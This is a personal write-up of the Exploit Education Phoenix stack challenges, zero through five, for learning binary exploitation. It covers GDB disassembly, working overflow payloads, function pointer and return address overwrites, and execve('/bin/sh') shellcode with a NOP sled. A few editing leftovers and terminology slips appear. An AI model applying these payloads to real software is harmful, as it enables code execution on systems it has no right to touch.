#  Phoenix:

**Phoenix** is the first part of the binary exploitation learning series by [Exploit Education](https://exploit.education/).

---

##  Getting Started

You can download the Phoenix challenge files from the official page:

 [exploit.education/downloads](https://exploit.education/downloads/)

> ⚠️ At the time of writing, the prebuilt repo wasn’t available.
> So, I built the VM manually using QEMU — and I’ll show you how to do the same!

---

## For Windows Users

### 1. **Download the Image**

* Choose the `amd64` version (or whichever matches your architecture).
* Format: `.qcow2` image inside a `.zip` file.

### 2. **Extract & Navigate**

```bash
unzip phoenix-amd64.zip
cd phoenix-amd64/
```

### 3. **Install QEMU**

QEMU is required to emulate the VM.
For best compatibility, run it through **WSL (Windows Subsystem for Linux)**.

Install QEMU (on WSL):

```bash
sudo apt update && sudo apt install qemu-system-x86
```

---

### 4. **Launch the VM**

Run the following from the extracted image directory:

```bash
qemu-system-x86_64 \
  -m 512M \
  -kernel ./vmlinuz-4.9.0-8-amd64 \
  -initrd ./initrd.img-4.9.0-8-amd64 \
  -hda ./exploit-education-phoenix-amd64.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -nographic
```

---

## Default Credentials

| Username | `user`   |
| -------- | -------- |
| Passowrd | `user`   |

---

## Accessing the Challenges

Once logged in:

```bash
cd /opt/phoenix/amd64
```

Replace `amd64` with your architecture if you're using a different one.

---

## You're In!

If everything worked, your terminal (via WSL) should show a login prompt and boot into the Phoenix VM. From here, you can start working on the binary exploitation challenges.

> Pro Tip: Use `tmux` or split terminals to keep debugger sessions, source code, and shell access visible at the same time.

---

# Stack-Zero

**Challenge**: [Phoenix/Stack-Zero](https://exploit.education/phoenix/stack-zero/)

**Goal**: Overflow the buffer and change the value of the `changeme` variable.

---

## Starting the Challenge

```bash
cd /opt/phoenix/amd64
./stack-zero
```

We see the following:

![intro](/assets/phoenix/hello.png)

It’s waiting for input — but it complains that `'changeme' has not yet been changed.`

---

## Initial Hypothesis

> My noob experience says that we have to change env variable `changeme` address or smth,
> I will avoid looking at source code — let’s f around.

---

## GDB Setup and Disassembly

Spun up GDB and dumped the disassembly of `main`:

![disassemble](/assets/phoenix/assembly.png)

This is the disassembled version. After setting a breakpoint at `main` and stepping through instructions, I understood the control flow. It looks something like:

![control flow](/assets/phoenix/control.jpg)

---

## Observing Behavior

From the disassembly, the goal is to bypass this check and reach the uncalled `puts()` that prints the success message.

To test this, I patched the binary to skip the conditional jump using EFLAGS:

![poc](/assets/phoenix/poc.png)

Boom! Got the success message:

> **Well done, the 'changeme' variable has been changed!**

---

## Deeper Static Analysis

Reading the assembly slowly, we find three important stack variables:

* `rbp-0x10`
* `rbp-0x54`
* `rbp-0x60`

Out of these, `rbp-0x10` seems like the flag `changeme` due to the following logic:

```asm
mov DWORD PTR [rbp-0x10], 0x0     ; initialize changeme = 0
...
call gets                         ; read input into buffer
mov eax, DWORD PTR [rbp-0x10]     ; load changeme
test eax, eax                     ; check if zero
je 0x40061c                       ; jump to fail if changeme == 0
```

So, `changeme` is at `rbp-0x10` and the input buffer is at `rbp-0x50`.

### Key Insight:

To overflow `changeme`, we need to write past the buffer:

``` assembly
0x50 - 0x10 = 0x40 = 64 bytes
```
![calculate](/assets/phoenix/caclu.jpg)

---

## The Exploit

Let’s test a buffer with 65 characters to overwrite the 64-byte buffer and flip `changeme`.

```bash
./stack-zero
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Result:

![success](/assets/phoenix/success.png)

Success!  We changed the `changeme` variable with a simple overflow.

---

## Summary

| Component  | Address      | Role             |
| ---------- | ------------ | ---------------- |
| `changeme` | `rbp-0x10`   | Flag we must set |
| `input`    | `rbp-0x50`   | 64-byte buffer   |
| `gets()`   |  Vulnerable  | No bounds check  |

### Exploit Strategy:

* Overflow 64 bytes into `changeme` by inputting 65+ characters.
* This causes the `test eax, eax` check to pass.
* We reach the success path and win.

---

## Takeaways

* `gets()` is dangerous — never use it.
* This challenge demonstrates a classic **stack-based buffer overflow**.
* You don’t always need the source — static and dynamic analysis (like GDB + disasm) is powerful.

# Stack-One

**Challenge**: [Phoenix/Stack-One](https://exploit.education/phoenix/stack-one/)

**Goal**: Overflow the buffer and set the correct value in a target variable to trigger the success path.

---

## Starting the Challenge

```bash
cd /opt/phoenix/amd64
./stack-one
```

![intro.png](/assets/phoenix/intro.png)

Hmm… Lets make this challenge a little interesting, ready? Evil smirks**

Strips the binary and spuns gdb---

```
cp /tmp/my-one stack-zero
strip /tmp/my-one
```
---
Analysis


```bash
gdb -nx /tmp/my-one
```

![strip](/assets/phoenix/strip.png)

``` bash
info files
```
[info](/assets/phoenix/info.png)

This gives us the entry point — e.g., `0x400500`. We dump 100 instructions:

```bash
x/100i 0x400500
```

![disass](/assets/phoenix/disass.png)

We see that `__libc_start_main@plt` is called and `%edi` is loaded with some value before that — that value is our real `main()` address (System V ABI).

---

## Locating `main()`

Let’s jump to the function in `%edi`, e.g., `0x40066d`:

```bash
x/40i 0x40066d
```

We now have the disassembly of the real main function.

---

## Disassembly Observations

Key lines:

```asm
=> 0x40066d:    push   rbp
   0x40066e:    mov    rbp,rsp
   0x400671:    sub    rsp,0x60
   0x400675:    mov    DWORD PTR [rbp-0x54],edi
   0x400678:    mov    QWORD PTR [rbp-0x60],rsi
   0x40067c:    mov    edi,0x400750
   0x400681:    call   0x4004c0 <puts@plt>
   0x400686:    cmp    DWORD PTR [rbp-0x54],0x1
   0x40068a:    jg     0x4006a0
   0x40068c:    mov    esi,0x4007a0
   0x400691:    mov    edi,0x1
   0x400696:    mov    eax,0x0
   0x40069b:    call   0x4004d0 <errx@plt>
   0x4006a0:    mov    DWORD PTR [rbp-0x10],0x0
   0x4006a7:    mov    rax,QWORD PTR [rbp-0x60]
   0x4006ab:    add    rax,0x8
   0x4006af:    mov    rdx,QWORD PTR [rax]
   0x4006b2:    lea    rax,[rbp-0x50]
   0x4006b6:    mov    rsi,rdx
   0x4006b9:    mov    rdi,rax
   0x4006bc:    call   0x4004a0 <strcpy@plt>
   0x4006c1:    mov    eax,DWORD PTR [rbp-0x10]
   0x4006c4:    cmp    eax,0x496c5962
   0x4006c9:    jne    0x4006d7
   0x4006cb:    mov    edi,0x4007d8
   0x4006d0:    call   0x4004c0 <puts@plt>
   0x4006d5:    jmp    0x4006eb
   0x4006d7:    mov    eax,DWORD PTR [rbp-0x10]
   0x4006da:    mov    esi,eax
   0x4006dc:    mov    edi,0x400820
   0x4006e1:    mov    eax,0x0
   0x4006e6:    call   0x4004b0 <printf@plt>
   0x4006eb:    mov    edi,0x0
   0x4006f0:    call   0x4004e0 <exit@plt>
```
By observing the above assembly we could determine the control flow:

![control](/assets/phoenix/control1.jpg)

## Stack Variables

From the layout:

| Variable   | Offset     | Notes                         |
| ---------- | ---------- | ----------------------------- |
| `argc`     | `rbp-0x54` | from `%edi`                   |
| `argv`     | `rbp-0x60` | from `%rsi`                   |
| `buffer`   | `rbp-0x50` | gets `argv[1]` via `strcpy()` |
| `changeme` | `rbp-0x10` | compared against `0x496c5962` |

---

## Exploitation Plan

We need to overwrite (`rbp-0x10`) with `0x496c5962`.

Given:

```
0x50 - 0x10 = 0x40 = 64 bytes
```

This means:

* Input buffer is 64 bytes long
* To overwrite, input must be **64 bytes of junk + 4-byte value**

---

## Exploit

```bash
./stack-one $(python3 -c 'print("A"*64 + "\x62\x59\x6c\x49")')
```

Why this works:

* Little-endian architecture
* `0x496c5962` = `"blyb"` in hex → reversed in memory as `\x62\x59\x6c\x49`

---

## Result

![success](/assets/phoenix/success1.png)

We have correctly set the correct value in a target variable!

---

## Summary

| Component     | Offset     | Role                     |
| ------------- | ---------- | ------------------------ |
| `changeme`    | `rbp-0x10` | Flag value to override   |
| `buffer`      | `rbp-0x50` | Target of `strcpy()`     |
| Overflow size | 64 + 4     | 64-byte buffer + 4 bytes |

---

## Key Takeaways

* No bounds check on `strcpy` = classic buffer overflow opportunity.
* Stripped binaries can be reversed by observing calling conventions.
* Static + dynamic analysis is often enough — no source needed.

# Stack-Two

**Challenge**: [Phoenix/Stack-Two](https://exploit.education/phoenix/stack-two/)

**Goal**: Overflow the stack-based buffer and set the correct value via an environment variable.

---
![input](/assets/phoenix/output.png)

## Initial Observations
We spin up GDB and:

![gdb](/assets/phoenix/gdb.png)

Okay wow — before I could strip the binary, it did it itself... (partially).

```bash
disassemble main
```
![assembly](/assets/phoenix/ass.png)

No peeking at source again — I’ll try to trace and build a control flow map manually.

---

## Control Flow & Parameters

![controlflow](/assets/phoenix/control2.jpg)

We can immediately observe use of `argc/argv` and a call to `getenv()` — a standard C library function for retrieving environment variables.

### getenv() Overview:

```c
char *getenv(const char *name);
```

* Takes one string argument — the name of the env var
* Returns a pointer to its value or `NULL` if not found
* Return value lives in `rax`

From this:

```
0x4006c6: mov edi, 0x4007da         ; "ExploitEducation"
0x4006cb: call getenv
0x4006d0: mov [rbp-0x8], rax
0x4006d4: cmp [rbp-0x8], 0x0
0x4006d9: jne 0x4006ef              ; if NULL, die
```

So, if `getenv()` returns `NULL` (i.e., the env variable is missing), we hit an `errx()` call:

```
stack-two: please set the ExploitEducation environment variable
```
and futhermore,

getenv's arguemnent must be string so lets check string stored in `0x4007da` (edi)

![Exploitedu](/assets/phoenix/ExploitEdu.png)

---

## Exploiting the Buffer

Eventually we hit:

```
0x4006fa: lea rax, [rbp-0x50]
0x4006fe: mov rsi, rdx
0x400701: mov rdi, rax
0x400704: call strcpy
```

Which copies the env value (from `rdx`) to our local buffer at `rbp-0x50`.

Then the same old pattern appears again:

```
0x4006ef: mov DWORD PTR [rbp-0x10], 0x0        ; changeme = 0
...
0x400709: mov eax, DWORD PTR [rbp-0x10]
0x40070c: cmp eax, 0xd0a090a
```

We need to overflow from `rbp-0x50` (input buffer) to `rbp-0x10` (target `changeme`), just like previous challenges.

---

### Gotcha:

The input is not taken directly from `argv`, but from the env variable named `"ExploitEducation"`.

---

## Calculating the Offset

Same math:

```
0x50 - 0x10 = 0x40 = 64 bytes
```

Little endian again — we’ll write the target value in reverse byte order.

```bash
\x0a\x09\x0a\x0d  -->  0xd0a090a
```

---

## The Payload

You can do this two ways:

### Terminal One-Liner:

```bash
ExploitEducation=$(python3 -c 'print("A"*64 + "\x0a\x09\x0a\x0d")') ./stack-two
```

### Python Script (cleaner for automation):

```python
import os

env = os.environ.copy()
env["ExploitEducation"] = b"A"*64 + b"\x0a\x09\x0a\x0d"

binary = "./stack-two"
argv = [binary.encode()]

os.execve(binary, argv, env)
```

---

## Result

![result](/assets/phoenix/success2.png)

```
Well done, you have successfully set changeme to the correct value.
```

Successful overflow via environment variable!

---

## Summary

|Component      | Value              | Role                      |
| ------------- | ------------------ | ------------------------- |
| changeme       | `rbp-0x10`         | Value we need to control  |
|  Buffer       | `rbp-0x50`         | 64 bytes, copied from env |
|  Env var      | "ExploitEducation" |        `getenv()`         |

---

## Takeaways

* Not all overflows come from `argv` or `gets()` — this one uses `getenv()`.
* Environment-based attacks are very real (especially in C binaries).
* Always use bounds-safe functions like `strncpy()` or better, not `strcpy()`.
* Even stripped binaries give away control flow with just GDB + disassembly.

# Stack Three

**Challenge**: [Phoenix/Stack-Three](https://exploit.education/phoenix/stack-three/)

**Goal**: This challenge revolves around overwriting a **function pointer** to redirect execution. Let's dive into the reverse engineering steps without looking at the source.

---

## Disassembly + Control Flow

![hello](/assets/phoenix/function.png)

Okay, interesting some function pointer it says,

The binary is dynamically linked and **partially stripped**,

![disasss](/assets/phoenix/disass.png)

---

Desiging control flow,

![control flow](/assets/phoenix/control3.jpg) -<!adddd image!!!!!!!!!!>--

I'm observing few things here, as always we have our argc and argv set up, further

Main function disassembly (key region):

```
0x4006b5 <+0>:   push   rbp
0x4006b6 <+1>:   mov    rbp,rsp
...
0x4006df <+42>:  call   0x4004e0 <gets@plt>
0x4006e4 <+47>:  mov    rax,QWORD PTR [rbp-0x10]
0x4006e8 <+51>:  test   rax,rax
0x4006eb <+54>:  je     0x400720 <main+109>
...
0x40070c <+87>:  mov    rdi,rax
0x40070f <+90>:  call   0x4004d0 <fflush@plt>
```

`gets()` writes input into `[rbp-0x50]`, and then a pointer at `[rbp-0x10]` is tested and later called if not null which leads to fflush(stdout) path and if je is statisfied we are led to exit.

Some context:
(gdb) x/s 0x400848
0x400848:       "function pointer remains unmodified :~( better luck next time!"
(gdb) x/s 0x400828
0x400828:       "calling function pointer @ %p\n"

here the if our rax is not equal to null, its leading down path of checking some function pointer, okay!

### Interpretation

* `rbp-0x50` is buffer
* `rbp-0x10` is a **function pointer** — it’s tested and conditionally called
* If left unmodified, the `rax == 0` path is taken → `puts("function pointer remains unmodified")`
* If modified to point to a real function, it gets called

I was confused a bit here, regarding what function pointer, the file struct buffer whatever at [rip+0x200418] (its stdout mapped in libc.so) is getting fflushed.

its likely that rbp-0x10 must have some function pointer, 

0x00000000004006e9 <+52>:    je     0x40071d <main+104>
0x00000000004006eb <+54>:    mov    rax,QWORD PTR [rbp-0x10]
0x00000000004006ef <+58>:    mov    rsi,rax


i spend some time here, did a nm and found some sus function

00000000004005a0 t register_tm_clones
0000000000600b20 B stdout
```

complete_level looks quite promising cause its marked as T meaning it resides in .text section.

---

## Goal

Hijack the function pointer at `[rbp-0x10]` with the address of a valid function, likely complete_level?:

```bash
function info complete_level
```

![complete-level](/assets/phoenix/complete_level.png)

we are very close now:)

```gdb
(gdb) x/s 0x400790
0x400790: "Congratulations, you've finished phoenix/stack-three :-) Well done!"
```

---

## Exploitation Strategy

We need to overflow the buffer and **inject the address of `complete_level`** into `[rbp-0x10]`.

### Offset Calculation

From buffer `[rbp-0x50]` to target `[rbp-0x10]`:

```plaintext
rbp-0x10 - rbp-0x50 = 0x40 = 64 bytes
```

So, to reach `[rbp-0x10]`, we overflow with **64 bytes**, then write 8 more bits to overwrite the function pointer.


---

### Final Payload Structure

``` python
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x9d\x06\x40\x00\x00\x00\x00\x00')") > /tmp/payload
```

```bash
./stack-three < /tmp/payload
```

---

## Outcome

With the payload in place, the binary prints:

![output](/assets/phoenix/output2.png)

```
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

---

## Final Thoughts

This is a **textbook function pointer overwrite** using a stack buffer overflow. Key takeaways:

* Always inspect stack layout in gdb
* Look out for conditional jumps based on attacker-controlled memory
* `nm` is your friend when symbols are present

# Stack-four

**Challenge**: [Phoenix/Stack-Four](https://exploit.education/phoenix/stack-four/)

**Goal**: Overwrite the return address from `start_level()` to jump directly to `complete_level()`.

---

## Initial Recon

![intro1](/assets/phoenix/intro1.png)

Okay very interesting, i will immediately do nm now instead of hitting around the bush

```sh
nm ./stack-four
```

```


Spotted two functions of interest:

* `start_level`: Entry point (like `main`)
* `complete_level`: Victory function — prints success and exits

---

## 🔧 Disassembly Insight

### `start_level` (Simplified)

```asm
start_level:
  ...
  lea    -0x50(%rbp), %rax     ; buffer for gets
  mov    %rax, %rdi
  call   gets
  mov    0x8(%rbp), %rax       ; return addr?
  mov    %rax, -0x8(%rbp)
  mov    -0x8(%rbp), %rax
  mov    %rax, %rsi            ; printf argument
  ...
  call   printf
```

### `complete_level`

```asm
complete_level:
  puts("Congratulations, you've finished phoenix/stack-four :-)")
  exit(0)
```

This is our target.

---

## Key Observation

Despite the obfuscation with `mov 0x8(%rbp) → -0x8(%rbp) → rsi`, all that’s just fluff.

The real vulnerability is from:

```asm
lea -0x50(%rbp), %rax
mov %rax, %rdi
call gets
```

So `gets()` writes to buffer at `rbp - 0x50`.

To **overwrite the return address**, we calculate offset from `rbp - 0x50` up to saved RIP.

Return address is saved at `rbp + 0x8`.

Hence:

```
padding = 0x50 + 0x8 = 88 bytes
```

---

## Final Payload

```python
payload = b"A" * 88 + p64(0x40061d)  # Address of complete_level
```

---

## Success Output

When executed correctly:

![success](/assets/phoenix/success3.png)

```
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

# Stack-Five

**Challenge**: [Phoenix/Stack-Five](https://exploit.education/phoenix/stack-five/)

**Goal**: The objective is to exploit a buffer overflow vulnerability by injecting shellcode and gaining control of the instruction pointer (RIP) to jump to that shellcode.

---

## Observations and Setup

![intro](/assets/phoenix/input.png)

Hm, this time no hints

Running the binary inside GDB, I saw:

```
(gdb) x/10i 0x4005a4  => main
   0x4005a4:    push   %rbp
   0x4005a5:    mov    %rsp,%rbp
   0x4005a8:    sub    $0x10,%rsp
   0x4005ac:    mov    %edi,-0x4(%rbp)
   0x4005af:    mov    %rsi,-0x10(%rbp)
   0x4005b3:    mov    $0x400620,%edi
   0x4005b8:    callq  0x400400 <puts@plt>
   0x4005bd:    mov    $0x0,%eax
   0x4005c2:    callq  0x40058d
   0x4005c7:    mov    $0x0,%eax
```
0x40058d is clearly the start_level
```
(gdb) x/9i 0x40058d
   0x40058d:    push   rbp
   0x40058e:    mov    rbp,rsp
   0x400591:    add    rsp,0xffffffffffffff80
   0x400595:    lea    rax,[rbp-0x80]
   0x400599:    mov    rdi,rax
   0x40059c:    call   0x4003f0 <gets@plt>
   0x4005a1:    nop
   0x4005a2:    leave
   0x4005a3:    ret
```

The main calls start_level and start_level is literally this

```
(gdb) x/10i 0x40058d
   0x40058d:    push   rbp
   0x40058e:    mov    rbp,rsp
   0x400591:    add    rsp,0xffffffffffffff80
   0x400595:    lea    rax,[rbp-0x80]
   0x400599:    mov    rdi,rax
   0x40059c:    call   0x4003f0 <gets@plt>
   0x4005a1:    nop
   0x4005a2:    leave
   0x4005a3:    ret
```

Now you may ask: **"How can we spawn a shell using `execve()`?"**
Well, the goal isn't just *popping a shell* — it's understanding the **environment** we're exploiting.

Let's start with basics.

Running:

```bash
checksec ./stack-five
```

...shows us **everything is disabled** — even **ASLR**.

###  What does that mean?

To us — exploit developers — it means we’re in a **very favorable environment**:

* No stack canaries 
* No NX bit 
* No PIE 
* No ASLR 

This is a dream setup for beginners. In this environment, we don’t need to bypass randomization or memory protection. We just need to **control `RIP`**, and **inject+execute shellcode**.

---

## Understanding the Shellcode Context

We aren’t given a function to jump to (like `complete_level()` in earlier stack challenges). Instead, we’re expected to **manually craft shellcode** to spawn a shell.

On Linux, the `execve()` syscall is the canonical way to run a program — in this case, `/bin/sh`. Its function signature is:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

For shell-spawning purposes, it’s common to use minimal parameters:

* `pathname`: pointer to the string `"/bin/sh"`
* `argv`: `NULL`
* `envp`: `NULL`

So all we need is to:

1. Load the string `"/bin/sh"` into memory
2. Pass its pointer into `rdi`
3. Set `rsi = 0`, `rdx = 0`
4. Set `rax = 59` (the syscall number for `execve`)
5. Trigger `syscall`

This is typically done with around 23–28 bytes of shellcode in x86\_64.

---

## Why Inject Shellcode? (Theory Behind Step 3)

Before we inject the shellcode, let’s quickly talk about how `execve()` works and why we don’t need to *call it directly* via libc.

```c
#include <unistd.h>

int execve(const char *pathname, char *const argv[], char *const envp[]);
```

Yes, we could search for the actual address of `execve` in memory — use something like `p execve` in GDB or recursively grep libc symbols. But we **don’t have to**.

Why?
Because it’s **far easier** to inject a handcrafted shellcode that *invokes `execve("/bin/sh", NULL, NULL)` directly via syscall*, rather than relying on external libraries.

This is often called **Heaven’s Gate** in the binary exploitation world — a moment where protections are conveniently low and custom shellcode **just works**.

There are other ways to inject shellcode too — into heap, `.data`, environment variables, or even via return-to-libc — but those require more precise address prediction and can become complicated fuzzing challenges.

### 💡 Why Use the Stack?

We inject into the **stack** because:

* It’s **controllable** — we can fill it with user input.
* It’s **predictable** — offset from ESP is easy to calculate.
* It’s **traceable** — we can set breakpoints, inspect stack state in GDB.

But, isn’t the **stack non-executable**?

Yes — on modern systems, **NX (Non-eXecutable)** bit makes stack execution illegal.

Luckily, in this challenge, **NX is disabled** — making it a perfect candidate for raw shellcode execution.

---

Let’s now move forward and inject it! ↓

## Python Exploit Code

```python
print(128 * b'A')
```

```bash
python3 /tmp/payload.py > /tmp/payload
```

```gdb
(gdb) break start_level
Breakpoint 1 at 0x400591

(gdb) run < /tmp/payload
Starting program: /opt/phoenix/amd64/stack-five < /tmp/payload
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x0000000000400591 in start_level ()
(gdb)
```

![gdb1](/assets/phoenix/gdb1.png)

Here we can see the script filled `rbp-0x80` as `rsp` is downward in stack and `rbp` is up in the stack:

```
Rbp
…
…
Rbp-0x80
Rsp
```

We have filled 128 times 'A', so we can see nothing is really overflowed. Let's add:

```python
print((128 + 8) * b'A')
```

![gdb2](/assets/phoenix/gdb2.png)

We are hitting a crucial point—I'm estimating 128 + 6 = 134 buffer from `rbp-0x80` to `rbp`.

We can confirm this as we are overflowing the `rbp` too by 134 bytes:

```gdb
0x0000000000274242 in ?? ()

r14            0x0                 0

rip            0x274242            0x274242
eflags         0x202               [ IF ]
```

We can say we are controlling the `rip`.

The start of our address is at `rbp-0x80`:

```gdb
(gdb) x/8x $rbp-0x80
0x7fffffffebe0: 0x41414141      0x41414141      0x00400000      0x00000000
0x7fffffffebf0: 0x004005a4      0x00000000      0x00000000      0x00000000
```

Okay, we have following information:

* Buffer starts at `rbp-0x80` : `0x7fffffffebe0`
* We can control our instruction pointer after 136 byte values

Let's do what we were supposed to do—controlling our stack and making our shellcode executable.

Like I said, we can control our `rip`, and we also know where our buffer starts (`rbp-0x80` i.e `0x7fffffffebe0`) so by 136 bytes + address we want to pivot (i.e `0x7fffffffebe0`) we can break the `rip`.

### script.py:

```python
import sys
import struct
addr = struct.pack("<Q", 0x7fffffffebe0)
sys.stdout.buffer.write(136 * b"A" + addr)
```

This should work.

---

```gdb
(gdb) ni
0x0000000000400595 in start_level ()
(gdb)
0x0000000000400599 in start_level ()
(gdb)
0x000000000040059c in start_level ()
(gdb)
0x00000000004005a1 in start_level ()
(gdb)
0x00000000004005a2 in start_level ()
(gdb)
0x00000000004005a3 in start_level ()
(gdb)
0x00007fffffffebe0 in ?? ()
```

Fine, next is we wanna make sure whatever shellcode we insert works. Instead of directly placing shellcode, we must put some debugging opcode like suggested `\xCC`.

`\xCC` is like signal sent to hardware to pause the execution and and set a trap called SIGTRAP.

# Shellcode Formation

Okay nicee! Let's actually make a shellcode now. You can refer to my [in-depth writeup on shellcode](https://nastyax0.github.io/post/shellcode.html)*_ATTENTION_*.

Here’s the assembly:

```asm
BITS 64
global _start

section .text
_start:
    xor     rax, rax               ; Clear RAX
    mov     rbx, 0x68732f2f6e69622f ; "/bin//sh" string
    push    rbx                    ; Push to stack
    mov     rdi, rsp               ; Set RDI to pointer to "/bin/sh"
    xor     rsi, rsi               ; NULL RSI
    xor     rdx, rdx               ; NULL RDX
    mov     al, 59                 ; syscall number for execve
    syscall                        ; invoke syscall
```

> For this you’ll need `nasm` and `ld`. Phoenix is old Debian — so you may need to update and install NASM first:

```bash
nasm -f elf64 /tmp/shellcode.asm -o /tmp/shellcode.o
ld /tmp/shellcode.o -o /tmp/shellcode
```

### Dumping Shellcode

```bash
objdump -d /tmp/shellcode | grep '[0-9a-f]:' | \
  cut -f2- -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | \
  sed 's/ $//' | sed 's/ /\\x/g' | sed 's/^/"/' | sed 's/$/"/'
```

This gives:

```c
"\x48\x31\xc0"
"\x48\xbb\x2f\x62\x69\x6e"
"\x2f\x73\x68\x00"
"\x53"
"\x48\x89\xe7"
"\x48\x31\xf6"
"\x48\x31\xd2"
"\xb0\x3b"
"\x0f\x05"
```

### Python Payload Builder

```python
import sys
import struct
addr = struct.pack("<Q", 0x7fffffffebe0)  # address to jump to
shellcode = (
    b"\x48\x31\xc0"
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x48\x31\xf6"
    b"\x48\x31\xd2"
    b"\xb0\x3b"
    b"\x0f\x05"
)
length = 136 - len(shellcode)
sys.stdout.buffer.write(shellcode + length * b'A' + addr)
```

### With NOP sled

```python
import sys
import struct
addr = struct.pack("<Q", 0x7fffffffebe0)
shellcode = 54 * b"\x90"  # NOP sled
shellcode += (
    b"\x48\x31\xc0"
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x48\x31\xf6"
    b"\x48\x31\xd2"
    b"\xb0\x3b"
    b"\x0f\x05"
)
length = 136 - len(shellcode)
sys.stdout.buffer.write(shellcode + length * b'A' + addr)
```

> Your NOPs depend on how close your return address is to shellcode.
> You might be so accurate you don’t need any at all.

![bin/dash](/assets/phoenix/binsh.png)

As you can see, we happily sled through our NOPs and hit the `/bin/sh` shell. 🎯

## Frustration Point

Here’s where it got messy. I initially used the **exact** address where the buffer began (`rbp - 0x80`, like `0x7fffffffebe0`), but the payload only worked **inside GDB** — not when run normally. Outside GDB, it failed.

Eventually, I realized that GDB’s environment and memory layout slightly shift things.

### Fix: Using a NOP Sled and Address Adjustment

I simply added 0x80 bytes worth of a NOP sled and jumped to an address 0x80 higher than `ebe0`, i.e., `0x7fffffffec60` — and it worked **outside** GDB.

This wasn't luck — it was trial and a lot of error.

> You need to spend some time guessing and debugging through it, check your ip and sp guess it add more padding increase or decrease your nops.

---

## Insight: Why Environment Affects Address

GDB, terminal size (`LINES`, `COLUMNS`), and other variables shift the stack. This causes the buffer address to vary slightly. To avoid this:

```bash
env -i ./stack-five < payload
```

This runs the binary in a clean environment. But even then, it might differ.

### Pro Tip:

Use a NOP sled and jump near the middle or end of the buffer.

## Attack:

Presenting you the devil itself:
``` pyth
import sys
import struct
addr = struct.pack("<Q", 0x7fffffffec60)  #its originally 0x7fffffffebe0 + 80
shellcode = 56 * b"\x90"
shellcode += (
    b"\x48\x31\xc0"
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x48\x31\xf6"
    b"\x48\x31\xd2"
    b"\xb0\x3b"
    b"\x0f\x05"
)
length = 136 - len(shellcode)
sys.stdout.buffer.write(shellcode+length*b'A'+addr)
```

The offset + 80 is through lots of trial and error outside the gdb environment, the gdb environment may not let you run this payload w/o errors because its different in gdb there must be smth different going on in that address and heres its different.


![done](/assets/phoenix/final.png)

We have successfully overflowed the buffer and ran our shellcode!
